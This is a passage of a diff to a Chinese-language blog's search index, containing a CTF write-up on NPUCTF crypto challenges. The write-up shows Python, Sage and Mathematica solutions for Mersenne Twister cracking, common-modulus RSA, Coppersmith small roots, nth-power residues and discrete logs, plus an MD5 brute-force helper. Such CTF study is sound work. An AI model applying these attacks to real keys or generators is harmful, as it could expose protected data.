class="line">            result |= part</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__inverse_temper</span><span class="params">(self, tempered)</span>:</span></span><br><span class="line">        value = tempered</span><br><span class="line">        value = self.__inverse_right_shift_xor(value, <span class="number">18</span>, self.__d)</span><br><span class="line">        value = self.__inverse_left_shift_xor(value, <span class="number">15</span>, self.__c)</span><br><span class="line">        value = self.__inverse_left_shift_xor(value, <span class="number">7</span>, self.__b)</span><br><span class="line">        value = self.__inverse_right_shift_xor(value, <span class="number">11</span>, self.__kMaxBits)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, tempered)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__inverse_temper(tempered)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MersenneTwisterCracker</span>:</span></span><br><span class="line">    __n = <span class="number">233</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mt_obj)</span>:</span></span><br><span class="line">        inverser  = TemperInverser()</span><br><span class="line">        register  = [inverser(int.from_bytes(random(), <span class="string">'big'</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(self.__n)]</span><br><span class="line">        self.__mt = mt73991(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># self.__state = 0</span></span><br><span class="line">        <span class="comment"># self.__register = register</span></span><br><span class="line">        self.__mt.load_register(register) <span class="comment"># 纠正</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__mt()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key , plain)</span>:</span></span><br><span class="line">    tmp = md5(plain).digest()</span><br><span class="line">    <span class="keyword">return</span> hexlify(XOR(tmp , key))</span><br><span class="line"></span><br><span class="line">all_letters = ascii_letters + digits + <span class="string">'.,;'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_md5</span><span class="params">(md5_value)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(md5_value)!=<span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    md5_value=md5_value.lower()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> permutations(all_letters,k):</span><br><span class="line">            item=<span class="string">''</span>.join(item)</span><br><span class="line">            <span class="keyword">if</span> md5(item.encode()).hexdigest()==md5_value:</span><br><span class="line">                <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
+<p>但是发现没有 seed 还是不行。</p>
+<blockquote>
+<p>至少加深了对算法理解（自慰安慰 😢 ）<br>
+估计算法的深处藏有爆破 seed 的方法（否则 $2^{32}$ 没办法得到 seed）。</p>
+</blockquote>
+<h1>共模攻击</h1>
+<p>附件1：<strong><a href="http://hint.py" target="_blank" rel="noopener">hint.py</a></strong></p>
+<blockquote>
+<p>后来这个文件被下架了，直接给出其实 🔥😠🔥 .（好吧，其实没差，hhh）</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> hint</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(hint)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">c = pow(m, <span class="number">256</span>, p)</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = getPrime(<span class="number">32</span>), getPrime(<span class="number">32</span>)</span><br><span class="line">c1, c2 = pow(c, e1, n), pow(c, e2, n)</span><br><span class="line">print(n)</span><br><span class="line">print(e1, c1)</span><br><span class="line">print(e2, c2)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">107316975771284342108362954945096489708900302633734520943905283655283318535709</span></span><br><span class="line"><span class="string">6807492006219935335233722232024809784434293293172317282814978688931711423939629682224374870233587969960713638310068784415474535033780772766171320461281579</span></span><br><span class="line"><span class="string">2303413961, 1754421169036191391717309256938035960912941109206872374826444526733030696056821731708193270151759843780894750696642659795452787547355043345348714129217723</span></span><br><span class="line"><span class="string">2622163991,1613454015951555289711148366977297613624544025937559371784736059448454437652633847111272619248126613500028992813732842041018588707201458398726700828844249</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<p><strong><a href="http://task.py" target="_blank" rel="noopener">task.py</a></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = p, q</span><br><span class="line">c1, c2 = pow(m, e1, n), pow(m, e2, n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">128205304743751985889679351195836799434324346996129753896234917982647254577214018524580290192396070591032007818847697193260130051396080104704981594190602854241936777324431673564677900773992273463534717009587530152480725448774018550562603894883079711995434332008363470321069097619786793617099517770260029108149</span></span><br><span class="line"><span class="string">96860654235275202217368130195089839608037558388884522737500611121271571335123981588807994043800468529002147570655597610639680977780779494880330669466389788497046710319213376228391138021976388925171307760030058456934898771589435836261317283743951614505136840364638706914424433566782044926111639955612412134198</span></span><br><span class="line"><span class="string">9566853166416448316408476072940703716510748416699965603380497338943730666656667456274146023583837768495637484138572090891246105018219222267465595710692705776272469703739932909158740030049375350999465338363044226512016686534246611049299981674236577960786526527933966681954486377462298197949323271904405241585</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<h2 id="hint-py"><a href="http://hint.py" target="_blank" rel="noopener">hint.py</a></h2>
+<h3 id="共模攻击">共模攻击</h3>
+<p><strong>第一部分：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = getPrime(<span class="number">32</span>), getPrime(<span class="number">32</span>)</span><br><span class="line">c1, c2 = pow(c, e1, n), pow(c, e2, n)</span><br><span class="line">print(n)</span><br><span class="line">print(e1, c1)</span><br><span class="line">print(e2, c2)</span><br></pre></td></tr></table></figure>
+<p>典型的共模攻击，破解：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">_, r, s = gcdext(e1, e2)</span><br><span class="line">c = pow(c1, r, n) * pow(c2, s, n) % n</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure>
+<h3 id="高次剩余">高次剩余</h3>
+<p><strong>第二部分：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = bytes_to_long(hint)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">c = pow(m, <span class="number">256</span>, p)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>
+<p>$$<br>
+c = m^{256} \pmod p<br>
+$$</p>
+<p>这里要进行高次剩余方程求解。<br>
+不过网上的板子几乎都是用 C++ 写的（ICPCer 的作品…）我也尝试过用 <a href="https://blog.csdn.net/dreamzuora/article/details/52744666" target="_blank" rel="noopener">N次剩余(详解+例题+代码)</a> 的 CPP 板子，然而…… <code>c </code> 是在太大，不得行…… 🙂</p>
+<blockquote>
+<p>关于算法，有篇博客写得很全面：<a href="https://www.cnblogs.com/zhouzhendong/p/Number-theory-Residue-System.html" target="_blank" rel="noopener">数论算法 剩余系相关 学习笔记 (基础回顾,(ex)CRT,(ex)lucas,(ex)BSGS,原根与指标入门,高次剩余,Miller_Robin+Pollard_Rho)</a> （仰望 ICPCer）</p>
+<p>可以调用大整数库，写下算法……（濒危动物表示写不动 😭 ）</p>
+</blockquote>
+<h4 id="Sympy">Sympy</h4>
+<p>后来发现 Sympy 里有求 高次剩余的函数……</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">19384002358725759679198917686763310349050988223627625096050800369760484237557</span></span><br><span class="line">n = <span class="number">107316975771284342108362954945096489708900302633734520943905283655283318535709</span></span><br><span class="line">mlst = nthroot_mod(c, <span class="number">256</span>, n, all_roots=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> mlst:</span><br><span class="line">    <span class="keyword">assert</span> pow(m, <span class="number">256</span>, n) == c</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m.bit_length() &lt; 400</span><br><span class="line">��&#125;�&#123;�6�k����Zs�A����U�H���</span><br><span class="line">�%��������)&#x3D;�-q������L�P\?�</span><br><span class="line">�CAz</span><br><span class="line">KA���UA��X*gp&#125;-LX��</span><br></pre></td></tr></table></figure>
+<h4 id="mma-Sage">mma / Sage</h4>
+<p>用 mma：</p>
+<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Simplify</span>[</span><br><span class="line"> <span class="keyword">Reduce</span>[</span><br><span class="line">  c == <span class="keyword">Mod</span>[m^<span class="number">256</span>, p] /.</span><br><span class="line">   &#123;c -&gt; <span class="number">1938400235872575967919891768676331034905098822362762509605080</span>\</span><br><span class="line"><span class="number">0369760484237557</span>,</span><br><span class="line">    p -&gt; <span class="number">1073169757712843421083629549450964897089003026337345209439052</span>\</span><br><span class="line"><span class="number">83655283318535709</span>&#125;,</span><br><span class="line">  m, <span class="keyword">Integers</span></span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>或者用 SageMath：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">107316975771284342108362954945096489708900302633734520943905283655283318535709</span></span><br><span class="line">c = <span class="number">1938400235872575967919891768676331034905098822362762509605080036976048423755</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x^<span class="number">256</span> - c</span><br><span class="line">f.monic().roots()</span><br></pre></td></tr></table></figure>
+<p>+Python</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mlist = [<span class="number">623314401187286670257694436875298172611109072944</span>,<span class="number">11812523831006378212663497485315375112114782670326938195125719701658999904789</span>, <span class="number">95504451940277963895699457459781114596785519963407582748779563953624318630920</span>, <span class="number">107316975771284342108362954944473175307713015963476826507029985482672209462765</span>]</span><br><span class="line">msglst =[]</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> mlist:</span><br><span class="line">    <span class="keyword">assert</span> pow(m, <span class="number">256</span>, p) == c</span><br><span class="line">    msglst.append(long_to_bytes(m))</span><br><span class="line">msglst</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">'m.bit_length() &lt; 400'</span>,</span><br><span class="line"> <span class="string">'\x1a\x1d\xa6\xcc&#125;\xb9\x1f&#123;\xe36\xe5k\xb3\xe6\xf3\xecZs\xb0A\xa2\x01\x88\x8b\x8aU\xf1H\xaa\xa6\xda\x15'</span>,</span><br><span class="line"> <span class="string">'\xd3%\x9a\xad\x8c\x91\xfc\xc5\xf7\xa7)=\x0e\x89-\x15q\xf1\xe6\xff\xd4\xcc\xfbL\xa4P\\?\xce\x1a\\\x08'</span>,</span><br><span class="line"> <span class="string">'\xedCAz\nK\x1cA\xda\xde\x0e\xa8UA\xbe\x98X\x06*\xdc\x08g\x0fp\x06&#125;-LX\x8d\x05\xed'</span>]</span><br></pre></td></tr></table></figure>
+<p>所以，我们费了半天功夫得到的提示是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m.bit_length() &lt; 400</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>😅😅😅😅😅😅😅😅<br>
+这不是废话吗？？？<br>
+🤕🤕🤕 稍后打脸</p>
+</blockquote>
+<h2 id="task-py"><a href="http://task.py" target="_blank" rel="noopener">task.py</a></h2>
+<p>$$<br>
+n = q*p<br>
+\\<br>
+c_1 = m^p \pmod n<br>
+\\<br>
+c_2 = m^q \pmod n<br>
+$$<br>
+确实是共模攻击，和后来下架 <code>hint.py</code> 之后的新的问题提示一样，此“共模攻击”非彼“共模攻击”。<br>
+模数确实一样，但我们不知道密钥……<br>
+看了 WP，发现 Hint 是给 Coppersmith定理攻击 的可行性的提示……</p>
+<blockquote>
+<p>Coppersmith 定理指出在一个 e 阶的 $\pmod n$ 多项式 $f(x)$ 中，如果有一个根小于$n^{1/e}$，就可以运用一个 $O(log n)$ 的算法求出这些根。</p>
+</blockquote>
+<p>以下是分析：<br>
+hint 给出 m 比特长度上界，联想到 coppersmith，再可行性分析如下：<br>
+$$<br>
+c_1 = m^p = m \pmod p<br>
+\\<br>
+c_2 = m^q = m \pmod q<br>
+\\<br>
+\therefore n | (c_1-m)(c_2-m)<br>
+\\<br>
+\text{上界：} , \frac{1}{2}n^{1/2}  \approx 2^{511}<br>
+$$<br>
+因为 m.bit_length() &lt; 400，所以可行性分析通过。</p>
+<p><strong>Sage</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">128205304743751985889679351195836799434324346996129753896234917982647254577214018524580290192396070591032007818847697193260130051396080104704981594190602854241936777324431673564677900773992273463534717009587530152480725448774018550562603894883079711995434332008363470321069097619786793617099517770260029108149</span></span><br><span class="line">c1= <span class="number">96860654235275202217368130195089839608037558388884522737500611121271571335123981588807994043800468529002147570655597610639680977780779494880330669466389788497046710319213376228391138021976388925171307760030058456934898771589435836261317283743951614505136840364638706914424433566782044926111639955612412134198</span></span><br><span class="line">c2= <span class="number">9566853166416448316408476072940703716510748416699965603380497338943730666656667456274146023583837768495637484138572090891246105018219222267465595710692705776272469703739932909158740030049375350999465338363044226512016686534246611049299981674236577960786526527933966681954486377462298197949323271904405241585</span></span><br><span class="line">PR.&lt;y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">g = (c1-y) * (c2-y)</span><br><span class="line">g.monic().small_roots(X=<span class="number">2</span>^<span class="number">400</span>, beta=<span class="number">1</span>)</span><br><span class="line">long_to_bytes(<span class="number">4242839043019782000788118887372132807371568279472499477998758466224002905442227156537788110520335652385855</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;verrrrrrry_345yyyyyyy_rsaaaaaaa_righttttttt?&#39;</span><br></pre></td></tr></table></figure>
+<h1>ezRSA</h1>
+<p>附件：<strong><a href="http://difficultrsa.py" target="_blank" rel="noopener">difficultrsa.py</a></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> lcm, powmod, invert, gcd, mpz</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">gift = lcm(p - <span class="number">1</span> , q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">54722</span></span><br><span class="line">flag = <span class="string">b'NPUCTF&#123;******************&#125;'</span></span><br><span class="line">m = int.from_bytes(flag , <span class="string">'big'</span>)</span><br><span class="line">c = powmod(m, e, n)</span><br><span class="line">print(<span class="string">'n: '</span>, n)</span><br><span class="line">print(<span class="string">'gift: '</span>, gift)</span><br><span class="line">print(<span class="string">'c: '</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n: 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span></span><br><span class="line"><span class="comment">#gift:  2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span></span><br><span class="line"><span class="comment">#c:  3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span></span><br></pre></td></tr></table></figure>
+<h2 id="分析-v3">分析</h2>
+<h3 id="λ-n-instead-of-φ-n">λ(n) instead of φ(n)</h3>
+<p>在 <a href="https://www.di-mgt.com.au/rsa_theory.html" target="_blank" rel="noopener">RSA Theory</a> 的 “Using λ(n) instead of φ(n)” 部分提到过：</p>
+<blockquote>
+<p>$d = e^{-1} \pmod {\phi(n)}$ 可以替换成  $d’ = e^{-1} \pmod {\lambda(n)}$，其中 $ \lambda(n) = lcm(p-1, q-1) = \frac{(p-1)(q-1)}{gcd(p-1, q-1)}$.</p>
+</blockquote>
+<p>这样一来，我们就可以用 λ(n)（题目中的 gift）来代替我们原本生成密钥的时候对 φ(n) 的需求。<br>
+需要注意的这道的中：$gcd(e, lcm) = 2$，不在 gift 的剩余系内（即没有逆元），所以需要进行适当地处理：<br>
+把 $c=m^e \pmod n$ 看成是 $c=(m^2 )^{(\frac{e}{2})} \pmod n$。</p>
+<p>$$<br>
+e’ = \frac{e}{2}<br>
+\\<br>
+d’ = (e^{ ’ })^{ -1 } \pmod { \lambda(n) }<br>
+\\<br>
+m^2 = c^{ d’ } \pmod {n}<br>
+$$</p>
+<p>之后就是一个二次剩余的问题了。</p>
+<h3 id="二次剩余">二次剩余</h3>
+<h4 id="Wolfram-爆破-v2">Wolfram 爆破</h4>
+<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Simplify</span>[</span><br><span class="line"> <span class="keyword">Reduce</span>[</span><br><span class="line">  c == <span class="keyword">Mod</span>[m^<span class="number">2</span>, p] /.</span><br><span class="line">   &#123;c -&gt; <span class="number">4457739276450750973807362088089319606097011997747961409022906575971021744219518190210017002304776543765491793897149413559709081776139101961</span>,</span><br><span class="line">    p -&gt; <span class="number">17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span>&#125;,</span><br><span class="line">  m, <span class="keyword">Integers</span></span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>然而并没有跑出来。<br>
+其他的方法也卡住了 😭</p>
+<hr>
+<p>WP 告诉了我们新的思路：“非有限域下的二次根求解难度在m足够大的时候几乎不可行，于是思路转向分解n”。<br>
+⭐️ 这道题考察的点实际上是已知(e, n, d)来分解 n<br>
+TODO: <a href="https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/#EzRSA" target="_blank" rel="noopener">https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/#EzRSA</a></p>
+<hr>
+<h1>总结</h1>
+<p>空闲时间比较有限，所以就碰了以上几道题目。<br>
+不得不说，主办方出的题有些魔性，参赛体验也比较糟糕，比赛开始没多久就被 DDoS 了，花了两天时间才恢复……<br>
+题目也很魔性，Misc 的抽象带师，flag 里面是中文+各种 emoji；一些题目信息放了又撤回等等……</p>
+<h1>参考资料</h1>
+<ol>
+<li><a href="https://liam.page/2018/01/12/Mersenne-twister/#mjx-eqn-eq%3Atwister" target="_blank" rel="noopener">谈谈梅森旋转：算法及其爆破</a></li>
+<li><a href="https://www.cnblogs.com/zhouzhendong/p/Number-theory-Residue-System.html" target="_blank" rel="noopener">数论算法 剩余系相关 学习笔记 (基础回顾,(ex)CRT,(ex)lucas,(ex)BSGS,原根与指标入门,高次剩余,Miller_Robin+Pollard_Rho)</a></li>
+<li><a href="https://blog.csdn.net/dreamzuora/article/details/52744666" target="_blank" rel="noopener">N次剩余(详解+例题+代码)</a></li>
+<li><a href="https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/#EzRSA" target="_blank" rel="noopener">WriteUp(NPUCTF) - Crypto</a></li>
+<li><a href="https://www.di-mgt.com.au/rsa_theory.html" target="_blank" rel="noopener">RSA Theory</a></li>
+<li><a href="https://masterpessimistaa.wordpress.com/2018/01/14/dlp-and-baby-step-giant-step-algorithm/" target="_blank" rel="noopener">DLP and Baby Step Giant Step Algorithm</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【深入浅出】基于拉格朗日松弛法的多约束 QoS 路由算法</title>
     <url>/2019/12/16/Lagrange/</url>
     <content><![CDATA[<h1>概要</h1>
@@ -3030,283 +3430,6 @@ $$<br>
         <tag>Lagrange Relaxation</tag>
         <tag>矩阵</tag>
         <tag>次梯度</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NPUCTF Write Up</title>
-    <url>/2020/04/21/NPUCTF-Writeup/</url>
-    <content><![CDATA[<p>周末的时候做了 NPUCTF  Crypto 部分的题目，题目有些一言难尽，但还是有很多收获，写了点 Write up。<br>
-（☁️更新中…… ）</p>
-<a id="more"></a>
-<h1>认清形势，建立信心</h1>
-<p>附件: <strong><a href="http://task.py" target="_blank" rel="noopener">task.py</a></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q </span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>))</span><br><span class="line"></span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(c)</span><br><span class="line">print(pow(<span class="number">2</span>, e, n))</span><br><span class="line">print(pow(<span class="number">4</span>, e, n))</span><br><span class="line">print(pow(<span class="number">8</span>, e, n))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">169169912654178</span></span><br><span class="line"><span class="string">128509160179202</span></span><br><span class="line"><span class="string">518818742414340</span></span><br><span class="line"><span class="string">358553002064450</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
-<h2 id="分析与解">分析与解</h2>
-<p>考点：简单数论、DLP</p>
-<h3 id="分析">分析</h3>
-<p>$$<br>
-c = m^e \pmod n<br>
-\\<br>
-c_1 = 2^e \pmod n<br>
-\\<br>
-c_2 = 4^e \pmod n<br>
-\\<br>
-c_3 = 8^e \pmod n<br>
-\\<br>
-\text{其中，} c, c_1, c_2, c_3 是已知的，其余的均未知。<br>
-$$</p>
-<blockquote>
-<p>未知参数过少，正是麻烦所在。</p>
-<p>基本思路是分别求出 <code>n</code>, <code>e</code>，之后就可以对 <code>c </code> 进行解密</p>
-</blockquote>
-<h3 id="解析">解析</h3>
-<h4 id="参数-n">参数 <code>n</code></h4>
-<p>$2, 4, 8$, 可以看成 $2^1, 2^2, 2^3$，故 $c_1, c_2, c_3$ 存在如下关系：<br>
-$$<br>
-c_1^2 = c_2 \pmod n<br>
-\\<br>
-c_1^3 = c_3 \pmod n<br>
-\\<br>
-\therefore n , | , gcd(c_1^2 - c_2, c_1^3 - c_3)<br>
-$$<br>
-所以可以得到 $n$</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c1 = <span class="number">128509160179202</span></span><br><span class="line">c2 = <span class="number">518818742414340</span></span><br><span class="line">c3 = <span class="number">358553002064450</span></span><br><span class="line">gcd = gmpy2.gcd(c1**<span class="number">2</span>-c2, c1**<span class="number">3</span>-c3)</span><br></pre></td></tr></table></figure>
-<p>得到：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcd = <span class="number">2</span> * <span class="number">18195301</span> * <span class="number">28977097</span></span><br><span class="line"><span class="comment"># 猜测&amp;尝试</span></span><br><span class="line">n = <span class="number">18195301</span> * <span class="number">28977097</span></span><br></pre></td></tr></table></figure>
-<h4 id="参数-e">参数 <code>e</code></h4>
-<p>$$<br>
-c=2^e \pmod {18195301 * 28977097}<br>
-$$</p>
-<p>这是典型的 DLP（Discrete Logarithm Problem，离散对数问题）</p>
-<h4 id="Wolfram-爆破">Wolfram 爆破</h4>
-<p>可以用 Wolfram：（应该是用纯暴力枚举的方法，虽然底层是 C 语言，但之前二次剩余跑了十七个小时也没跑出来 🤧）</p>
-<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Simplify</span>[</span><br><span class="line">	<span class="keyword">Reduce</span>[</span><br><span class="line">	  c == <span class="keyword">Mod</span>[<span class="number">2</span>^k, p] /. &#123;c -&gt; <span class="number">128509160179202</span>, p -&gt; <span class="number">527247002021197</span>&#125;, k,<span class="keyword">Integers</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-<p>得到结果：</p>
-<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">C[<span class="number">1</span>] \[<span class="keyword">Element</span>] <span class="keyword">Integers</span> &amp;&amp; C[<span class="number">1</span>] &gt;= <span class="number">0</span> &amp;&amp; k == <span class="number">808723997</span> + <span class="number">4393724623740</span> C[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
-<p>得到 <code>e=808723997</code>，并在终端进行简单验证：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> pow(<span class="number">2</span>, <span class="number">808723997</span>, n) == c1</span><br></pre></td></tr></table></figure>
-<h4 id="常规解密">常规解密</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Python2.7</span></span><br><span class="line"><span class="comment"># Author: ZER0-Nu1L</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line">e = <span class="number">808723997</span></span><br><span class="line">p = <span class="number">18195301</span></span><br><span class="line">q = <span class="number">28977097</span></span><br><span class="line">n = q * p</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = long_to_bytes(pow(c, d, n))</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npuctf&#123;345y&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="另解-BSGS-算法">另解 BSGS 算法</h4>
-<blockquote>
-<p>BSGS（Baby Step Giant Step） 虽然不是 DLP 算法中 时间空间复杂度最低的算法，但相对于 Pollard’s $\rho$ 算法（当前认为最优的算法）实现起来容易很多，时间复杂度（$O(\sqrt n)$）相同，所以无论是 ICPC 还是 CTF 都是最优的选择之一。</p>
-</blockquote>
-<p>C 语言需要调大整数库，实现起来稍微比较麻烦。<br>
-Python 的 BSGS 板子（没有优化）：</p>
